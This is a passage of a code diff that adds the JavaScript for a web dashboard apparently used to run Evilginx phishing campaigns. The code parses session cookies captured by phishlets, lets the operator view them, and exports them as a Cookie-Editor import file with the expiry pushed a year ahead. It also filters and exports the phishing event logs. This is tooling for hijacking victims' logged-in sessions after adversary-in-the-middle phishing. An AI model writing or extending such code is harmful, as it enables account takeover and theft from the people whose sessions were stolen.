+                this.fallbackCopy(textToCopy);
+            }
+        },
+        fallbackCopy(text) {
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.opacity = '0';
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                document.execCommand('copy');
+                showToast('Copied!', 'success');
+            } catch (e) {
+                showToast('Copy failed', 'error');
+            }
+            document.body.removeChild(textarea);
+        },
+        parseTokens(raw) {
+            const state = { cookies: [], pairs: [], raw: raw || '' };
+            if (!raw) return state;
+            try {
+                const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
+                if (Array.isArray(parsed)) {
+                    // Flat array format: [{name, value, ...}]
+                    state.cookies = parsed
+                        .filter(c => c.name && c.value)
+                        .map(c => ({
+                            name: c.name,
+                            value: c.value,
+                            domain: c.domain || '',
+                            path: c.path || '/',
+                            httpOnly: !!c.httpOnly
+                        }));
+                } else if (parsed && typeof parsed === 'object') {
+                    // Check for Evilginx nested format: {domain: {cookieName: {Name, Value, Path, HttpOnly}}}
+                    const firstKey = Object.keys(parsed)[0];
+                    const firstValue = parsed[firstKey];
+
+                    if (firstValue && typeof firstValue === 'object' && !Array.isArray(firstValue)) {
+                        // Check if it's the nested cookie structure
+                        const innerFirstKey = Object.keys(firstValue)[0];
+                        const innerFirstValue = firstValue[innerFirstKey];
+
+                        if (innerFirstValue && (innerFirstValue.Name !== undefined || innerFirstValue.Value !== undefined)) {
+                            // Evilginx format: {domain: {cookieName: CookieToken}}
+                            Object.entries(parsed).forEach(([domain, cookies]) => {
+                                if (cookies && typeof cookies === 'object') {
+                                    Object.entries(cookies).forEach(([cookieName, cookie]) => {
+                                        if (cookie && (cookie.Value || cookie.value)) {
+                                            state.cookies.push({
+                                                name: cookie.Name || cookie.name || cookieName,
+                                                value: cookie.Value || cookie.value || '',
+                                                domain: domain,
+                                                path: cookie.Path || cookie.path || '/',
+                                                httpOnly: cookie.HttpOnly || cookie.httpOnly || false
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        } else {
+                            // Simple nested object - treat as key/value pairs
+                            state.pairs = Object.entries(parsed).map(([k, v]) => ({
+                                key: k,
+                                value: typeof v === 'object' ? JSON.stringify(v) : String(v)
+                            }));
+                        }
+                    } else {
+                        // Simple key/value object
+                        state.pairs = Object.entries(parsed).map(([k, v]) => ({
+                            key: k,
+                            value: typeof v === 'object' ? JSON.stringify(v) : String(v)
+                        }));
+                    }
+                }
+            } catch (e) { console.warn('Token parse error:', e); }
+            return state;
+        },
+        openTokenViewer(raw, label) {
+            const parsed = this.parseTokens(raw);
+            this.tokenView = {
+                label: label || 'Session tokens',
+                cookies: parsed.cookies,
+                pairs: parsed.pairs,
+                raw: parsed.raw
+            };
+        },
+        // Export cookies as JSON file in Cookie-Editor compatible flat array format
+        exportCookies(raw, label) {
+            const parsed = this.parseTokens(raw);
+            if (!parsed.cookies || parsed.cookies.length === 0) {
+                showToast('No cookies to export', 'warning');
+                return;
+            }
+            
+            // Convert to Cookie-Editor compatible format (flat array)
+            const cookieEditorFormat = parsed.cookies.map(c => ({
+                name: c.name,
+                value: c.value,
+                domain: c.domain.startsWith('.') ? c.domain : (c.domain ? '.' + c.domain : ''),
+                path: c.path || '/',
+                httpOnly: c.httpOnly || false,
+                secure: c.name.startsWith('__Host-') || c.name.startsWith('__Secure-') || false,
+                sameSite: 'Lax',
+                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) // 1 year from now
+            }));
+            
+            const jsonStr = JSON.stringify(cookieEditorFormat, null, 2);
+            const blob = new Blob([jsonStr], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            // Sanitize filename
+            const safeName = (label || 'cookies').replace(/[^a-zA-Z0-9_-]/g, '_').substring(0, 50);
+            a.download = `${safeName}_cookies.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast(`Exported ${cookieEditorFormat.length} cookies`, 'success');
+        },
+        viewDetails(e) { this.selectedEvent = e; },
+        closeDetails() { this.selectedEvent = null; },
+        exportJSON() {
+            const data = this.filteredEvents();
+            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'events.json';
+            a.click();
+            URL.revokeObjectURL(url);
+        },
+        exportCSV() {
+            const rows = this.filteredEvents();
+            if (!rows.length) return;
+            const headers = Object.keys(rows[0]);
+            const esc = v => `"${String(v||'').replace(/"/g,'""')}"`;
+            const body = rows.map(r => headers.map(h => esc(r[h])).join(',')).join('\n');
+            const csv = headers.join(',') + '\n' + body;
+            const blob = new Blob([csv], {type:'text/csv'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'events.csv';
+            a.click();
+            URL.revokeObjectURL(url);
+        },
+        copyFilterLink() {
+            const params = new URLSearchParams();
+            if (this.filterType !== 'all') params.set('type', this.filterType);
+            if (this.filterPhishlet) params.set('phishlet', this.filterPhishlet);
+            if (this.filterSearch) params.set('q', this.filterSearch);
+            if (this.filterTime !== 'all') params.set('time', this.filterTime);
+            const url = `${location.origin}${location.pathname}?${params.toString()}`;
+            navigator.clipboard.writeText(url).then(() => showToast('Filter link copied!', 'success'));
+        },
+        applyFiltersFromURL() {
+            const params = new URLSearchParams(location.search);
+            if (params.get('type')) this.filterType = params.get('type');
+            if (params.get('phishlet')) this.filterPhishlet = params.get('phishlet');
+            if (params.get('q')) this.filterSearch = params.get('q');
+            if (params.get('time')) this.filterTime = params.get('time');
+        },
+        saveCurrentFilter(name) {
+            if (!name) return;
+            this.savedFilters.push({
+                name,
+                filterType: this.filterType,
+                filterPhishlet: this.filterPhishlet,
+                filterSearch: this.filterSearch,
+                filterTime: this.filterTime,
+            });
+            localStorage.setItem('savedFilters', JSON.stringify(this.savedFilters));
+        },
+        applySavedFilter(name) {
+            const f = this.savedFilters.find(x => x.name === name);
+            if (!f) return;
+            this.filterType = f.filterType;
+            this.filterPhishlet = f.filterPhishlet;
+            this.filterSearch = f.filterSearch;
+            this.filterTime = f.filterTime;
+        },
+        loadSavedFilters() {
+            try {
+                const raw = localStorage.getItem('savedFilters');
+                if (raw) this.savedFilters = JSON.parse(raw);
+            } catch (e) {}
+        }
+      }
+    }
+  </script>
+</body>
+</html>
